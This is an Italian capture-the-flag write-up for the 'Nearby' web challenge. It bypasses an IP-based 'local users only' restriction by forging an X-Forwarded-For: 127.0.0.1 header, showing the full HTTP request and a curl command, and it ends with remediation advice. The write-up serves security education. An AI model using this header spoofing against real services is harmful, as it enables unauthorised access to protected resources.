**Writeup:  "Nearby"**

**Descrizione della Sfida**  
Il sito web (`nearby.challs.olicyber.it:37005`) limita l'accesso solo agli utenti locali. L'obiettivo è bypassare questa restrizione e recuperare la flag.

---

### **Analisi**
1. **Richiesta Iniziale e Risposta**  
   - Inviando una richiesta GET standard a `/`, otteniamo:  
     ```html
     <h1>Questa pagina è abilitata solo agli utenti locali. Non è accessibile da remoto.</h1>
     <p>Il tuo ip potrebbe essere 10.42.0.94.</p>
     ```
   - Il server identifica l'IP del client come `10.42.0.94` (un IP privato), ma blocca comunque l'accesso. Questo suggerisce che il server applica un controllo più rigoroso, probabilmente verificando se l'IP è `127.0.0.1`.

2. **Ipotesi**  
   Il server probabilmente utilizza gli header HTTP per determinare l'IP del client. Gli header comuni includono:
   - `X-Forwarded-For`: Usato dai proxy per passare l'IP originale del client.
   - Se il server si fida ciecamente di questi header senza validazione, forgiarli potrebbe bypassare la restrizione.

---

### **Sfruttamento**
1. **Forgiare gli Header**  
   Per simulare una richiesta locale, manipoliamo gli header per falsificare un IP loopback (`127.0.0.1`):

   ```http
   GET / HTTP/1.1
   Host: nearby.challs.olicyber.it:37005
   X-Forwarded-For: 127.0.0.1  <!-- IP Falsificato -->
   Cache-Control: max-age=0
   DNT: 1
   Upgrade-Insecure-Requests: 1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
   Accept-Encoding: gzip, deflate, br
   Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6
   Connection: keep-alive
   ```

2. **Test con `curl`**  
   Eseguiamo la richiesta usando `curl` con l'header falsificato:
   ```bash
   curl -H "X-Forwarded-For: 127.0.0.1" http://nearby.challs.olicyber.it:37005
   ```

3. **Risultato**  
   Il server risponde con la flag, confermando il bypass riuscito:
   ```html
   <html>
     <body>
       <p>Ben fatto! La flag è flag{REDACTED}</p>
     </body>
   </html>
   ```

---

### **Osservazioni Chiave**
- **Errata Configurazione della Fiducia negli Header**: Il server si fida ciecamente dell'header `X-Forwarded-For`, permettendo la falsificazione dell'IP.
- **Consigli per la Sicurezza**:  
  - Validare gli header rispetto a proxy attendibili.
  - Utilizzare `REMOTE_ADDR` (l'IP effettivo della connessione TCP) invece degli header per il controllo degli accessi.
  - Whitelistare gli IP consentiti a livello di rete.

---

**Flag**: `flag{REDACTED}`
